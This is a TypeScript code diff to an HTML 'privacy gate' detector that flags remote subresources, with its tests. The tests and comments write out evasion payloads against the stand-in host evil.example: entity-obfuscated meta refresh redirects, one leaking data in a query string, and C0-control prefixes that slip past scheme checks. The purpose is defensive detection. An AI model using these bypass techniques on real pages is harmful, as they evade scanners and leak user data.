@@ -178,16 +178,31 @@ function readSrcValue(attrs: string): string | null {
 // character references first, so `&#x68;ttps://evil.example/x.png` is a real https fetch, and
 // the URL parser then strips ASCII tab/LF/CR from anywhere in the input, so `ht<TAB>tps://…`
 // is too. Neither carries a scheme the raw-text regex below can see.
+// Decode NUMERIC character references. Split out of normalizeUrlValue because the refresh pragma
+// needs the same decoding applied to its SYNTAX, not just to the URL it yields. Named references
+// are deliberately not decoded — the table is out of proportion for a tripwire — so each caller
+// rejects or over-reports on a surviving `&` instead.
+function decodeCharRefs(value: string): string {
+  return value.replace(/&#(x[0-9a-f]+|\d+);?/gi, (_match, code: string) =>
+    String.fromCodePoint(
+      code[0].toLowerCase() === 'x' ? parseInt(code.slice(1), 16) : parseInt(code, 10),
+    ),
+  );
+}
+
 function normalizeUrlValue(rawValue: string): string {
-  return rawValue
-    .replace(/^["']|["']$/g, '')
-    .replace(/[\t\n\r]/g, '')
-    .replace(/&#(x[0-9a-f]+|\d+);?/gi, (_match, code: string) =>
-      String.fromCodePoint(
-        code[0].toLowerCase() === 'x' ? parseInt(code.slice(1), 16) : parseInt(code, 10),
-      ),
-    )
-    .trim();
+  return (
+    decodeCharRefs(rawValue.replace(/^["']|["']$/g, '').replace(/[\t\n\r]/g, ''))
+      // The URL parser strips leading/trailing C0-control-or-space, which is NOT what JS `.trim()`
+      // strips — measured: `.trim()` leaves 26 code points (U+0001–U+0008, U+000E–U+001F) in place
+      // that the parser removes, so `&#1;https://evil.example/` kept a value with no scheme in
+      // scheme position and `isLocalInTreeSrc` waved it through while a real browser fetched
+      // `https://evil.example/`. Found in review, on a helper that predates this change but that
+      // the refresh pragma — the vector with no runtime control — now depends on. Trimming exactly
+      // the parser's set is also narrower than `.trim()` in the right direction: a leading NBSP is
+      // NOT stripped by the URL parser either, so such a value really does stay same-origin.
+      .replace(/^[\u0000-\u0020]+|[\u0000-\u0020]+$/g, '')
+  );
 }
 
 // A `<script src=…>` is only benign because the module it loads is itself scanned by the
@@ -264,7 +279,21 @@ function findScriptViolations(rawHtml: string, label: string): string[] {
 // `src` covers img/iframe/audio/video/source/track/embed/input[type=image]; `data` is <object>;
 // `action`/`formaction` are submission targets a script can trigger; `background` is the legacy
 // <body>/<table>/<tr>/<td> attribute Chrome still maps to background-image and still fetches.
-const URL_ATTRS = new Set(['src', 'srcset', 'poster', 'data', 'action', 'formaction', 'background']);
+// `imagesrcset` is what `<link rel="preload" as="image">` actually fetches from when present, and
+// it takes the same candidate-list grammar as `srcset`.
+const URL_ATTRS = new Set([
+  'src',
+  'srcset',
+  'imagesrcset',
+  'poster',
+  'data',
+  'action',
+  'formaction',
+  'background',
+]);
+
+// The attributes carrying a `srcset`-style candidate list rather than one URL.
+const SRCSET_ATTRS = new Set(['srcset', 'imagesrcset']);
 
 // `href` is checked on every tag EXCEPT these. Inverted from the old `['link', 'base']` allowlist
 // deliberately: the set of tags that fetch from `href` is not one anybody can enumerate correctly
@@ -342,9 +371,16 @@ function readMetaRefreshTargets(
     // Trimmed before comparing, which a real parser does NOT do — `http-equiv=" refresh "` is inert
     // in Chrome (the spec matches the attribute value exactly, ASCII case-insensitively). Treating
     // it as live over-reports, the safe direction.
+    // Decoded BEFORE the comparison and before the grammar below, not after. The HTML parser
+    // resolves character references in an attribute value before the refresh algorithm ever runs,
+    // so an entity can hide in the pragma name (`ref&#x72;esh`), the separator (`0&#59;url=`) or
+    // the keyword (`u&#x72;l=`) — all three measured as live navigations that a raw-text read
+    // returned clean for. Decoding only the extracted URL, as the first cut did, is too late: the
+    // grammar has already failed to find it. This is the same "classify the value the browser
+    // resolves, not the text in the file" rule `normalizeUrlValue` exists for, applied to syntax.
     if (attr === 'http-equiv') {
-      if (stripQuotes(value).trim().toLowerCase() === 'refresh') isRefresh = true;
-    } else if (attr === 'content') contents.push(stripQuotes(value));
+      if (decodeCharRefs(stripQuotes(value)).trim().toLowerCase() === 'refresh') isRefresh = true;
+    } else if (attr === 'content') contents.push(decodeCharRefs(stripQuotes(value)));
   }
   if (!isRefresh) return [];
   return contents
@@ -394,7 +430,7 @@ function findSubresourceViolations(rawHtml: string, label: string): string[] {
       // itself rather than off-origin, so the report is an over-report — the safe direction.
       const fetches = URL_ATTRS.has(attr) || (isHrefAttr(attr) && !HREF_EXEMPT_TAGS.has(tag));
       if (!fetches || value === undefined) continue;
-      const targets = attr === 'srcset' ? splitSrcset(value) : [value];
+      const targets = SRCSET_ATTRS.has(attr) ? splitSrcset(value) : [value];
       for (const target of targets) {
         if (isLocalInTreeSrc(target)) continue;
         // Name the offending target: a srcset with two remote candidates would otherwise emit the
@@ -926,14 +962,69 @@ describe('privacy gate detector: remote subresources in HTML', () => {
     expect(
       findSubresourceViolations('<meta http-equiv="refresh" content="5,url=https://evil.example/c">', 'h'),
     ).toEqual(['h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/c']);
+    // Reported decoded rather than raw, because the value is now decoded before the grammar runs.
     expect(
       findSubresourceViolations(
         '<meta http-equiv="refresh" content="0;url=&#x68;ttps://evil.example/hex">',
         'h',
       ),
-    ).toEqual([
-      'h:1 — remote or out-of-tree <meta http-equiv=refresh>: &#x68;ttps://evil.example/hex',
+    ).toEqual(['h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/hex']);
+  });
+
+  it('decodes a character reference hiding in the refresh SYNTAX, not just the URL', () => {
+    // Three payloads found in review, each measured in happy-dom as arriving at the refresh
+    // algorithm fully decoded — `http-equiv="refresh"`, `content="0;url=https://evil.example/leak"` —
+    // and each returning `[]` from the first cut, which compared and parsed raw text and only
+    // decoded the URL it had already failed to extract. The entity can sit in the pragma name, the
+    // separator, or the `url` keyword; decoding has to precede the grammar, not follow it.
+    for (const html of [
+      '<meta http-equiv="ref&#x72;esh" content="0;url=https://evil.example/leak">',
+      '<meta http-equiv="refresh" content="0&#59;url=https://evil.example/leak">',
+      '<meta http-equiv="refresh" content="0;u&#x72;l=https://evil.example/leak">',
+      '<meta http-equiv="refresh" content="&#48;;url=https://evil.example/leak">',
+    ]) {
+      expect(findSubresourceViolations(html, 'h'), html).toEqual([
+        'h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/leak',
+      ]);
+    }
+  });
+
+  it('strips the C0 controls the URL parser strips but String.trim() does not', () => {
+    // `&#1;` decodes to U+0001, which the HTML tokenizer keeps verbatim (only U+0000 is remapped)
+    // and the URL parser then strips as leading C0-control-or-space — so the value resolves to
+    // `https://evil.example/…` and fetches. JS `.trim()` leaves 26 such code points in place
+    // (U+0001–U+0008, U+000E–U+001F, enumerated against Node's URL parser), so the scheme test saw
+    // a control character in scheme position and called the value local. Found in review; it hits
+    // the pre-existing `<img src>` path as well as the new refresh one, which is why it is fixed in
+    // normalizeUrlValue rather than at either call site.
+    expect(findSubresourceViolations('<img src="&#1;https://evil.example/x.png">', 'h')).toEqual([
+      'h:1 — remote or out-of-tree <img src>: &#1;https://evil.example/x.png',
     ]);
+    expect(
+      findSubresourceViolations(
+        '<meta http-equiv="refresh" content="0;url=&#1;https://evil.example/?d=leak">',
+        'h',
+      ),
+    ).toEqual([
+      'h:1 — remote or out-of-tree <meta http-equiv=refresh>: https://evil.example/?d=leak',
+    ]);
+    // A leading NBSP is NOT stripped by the URL parser, so that value really does stay same-origin —
+    // the narrower strip is correct here, not a regression from dropping `.trim()`.
+    expect(findSubresourceViolations('<img src=" ./ok.png">', 'h')).toEqual([]);
+  });
+
+  it('flags a remote imagesrcset on a preload link', () => {
+    // What `<link rel="preload" as="image">` actually fetches from when present; it takes the same
+    // candidate-list grammar as `srcset`. Raised in review as a one-token gap.
+    expect(
+      findSubresourceViolations(
+        '<link rel="preload" as="image" imagesrcset="https://evil.example/p.png 1x">',
+        'h',
+      ),
+    ).toEqual(['h:1 — remote or out-of-tree <link imagesrcset>: https://evil.example/p.png']);
+    expect(
+      findSubresourceViolations('<link rel="preload" as="image" imagesrcset="./p.png 1x">', 'h'),
+    ).toEqual([]);
   });
 
   it('is not fooled by a duplicate http-equiv or content attribute', () => {
